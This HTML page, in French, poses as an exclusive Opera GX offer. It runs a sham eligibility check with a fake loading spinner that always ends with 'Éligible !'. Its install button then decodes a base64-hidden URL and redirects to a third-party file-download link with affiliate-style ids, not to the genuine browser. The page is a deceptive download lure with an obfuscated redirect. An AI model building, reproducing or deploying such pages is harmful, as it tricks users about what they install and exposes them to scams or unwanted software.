<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Offre Opera GX</title>
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .step { display: none; }
        .step.active { display: block; }
        .btn { background: #ef4444; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
        .loading { border: 4px solid #334155; border-top: 4px solid #ef4444; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <div id="step1" class="step active">
            <h2>Offre Exclusive Opera GX</h2>
            <p>Vérifiez votre éligibilité en France.</p>
            <button class="btn" onclick="showStep(2)">COMMENCER</button>
        </div>

        <div id="step2" class="step">
            <h3>Êtes-vous sur PC ?</h3>
            <button class="btn" onclick="showStep(3)">OUI</button>
            <button class="btn" onclick="showStep(3)" style="opacity: 0.5;">NON</button>
        </div>

        <div id="step3" class="step">
            <h3>Vérification...</h3>
            <div class="loading"></div>
        </div>

        <div id="step4" class="step">
            <h2 style="color: #4ade80;">Éligible !</h2>
            <p>Cliquez pour installer Opera GX.</p>
            <button class="btn" style="background: #22c55e;" onclick="finish()">INSTALLER MAINTENANT</button>
        </div>
    </div>

    <script>
        function showStep(n) {
            // Cacher toutes les étapes
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            // Afficher l'étape demandée
            document.getElementById('step' + n).classList.add('active');
            
            // Si c'est l'étape de chargement, on passe au final après 2 secondes
            if(n === 3) {
                setTimeout(() => { showStep(4); }, 2000);
            }
        }

        function finish() {
            var b64 = "aHR0cHM6Ly9zaW5naW5nZmlsZXMuY29tL3Nob3cucGhwP2w9MCZ1PTI1MTQyNTMmaWQ9NDY1NTY=";
            window.location.href = atob(b64);
        }
    </script>
</body>
</html>
